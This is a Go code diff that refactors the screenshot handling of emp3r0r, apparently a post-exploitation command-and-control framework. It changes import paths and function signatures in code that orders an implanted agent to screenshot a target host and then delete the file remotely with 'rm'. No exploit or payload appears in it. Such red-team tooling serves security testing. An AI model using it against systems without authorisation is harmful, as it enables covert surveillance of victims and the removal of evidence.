@@ -8,7 +8,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/lib/agent"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archiver"
 )
@@ -17,7 +17,7 @@ import (
 // open the picture if possible
 func TakeScreenshot() {
 	// tell agent to take screenshot
-	err := SendCmdToCurrentTarget("screenshot")
+	err := SendCmdToCurrentTarget("screenshot", "")
 	if err != nil {
 		CliPrintError("send screenshot cmd: %v", err)
 		return
@@ -26,7 +26,7 @@ func TakeScreenshot() {
 	// then we handle the cmd output in agentHandler
 }
 
-func processScreenshot(out string, target *agent.SystemInfo) (err error) {
+func processScreenshot(out string, target *emp3r0r_data.SystemInfo) (err error) {
 	if strings.Contains(out, "Error") {
 		return fmt.Errorf(out)
 	}
@@ -72,7 +72,7 @@ func processScreenshot(out string, target *agent.SystemInfo) (err error) {
 	}
 
 	// tell agent to delete the remote file
-	err = SendCmd("rm "+out, target)
+	err = SendCmd("rm "+out, "", target)
 	if err != nil {
 		CliPrintWarning("Failed to delete remote file %s: %v", strconv.Quote(out), err)
 	}
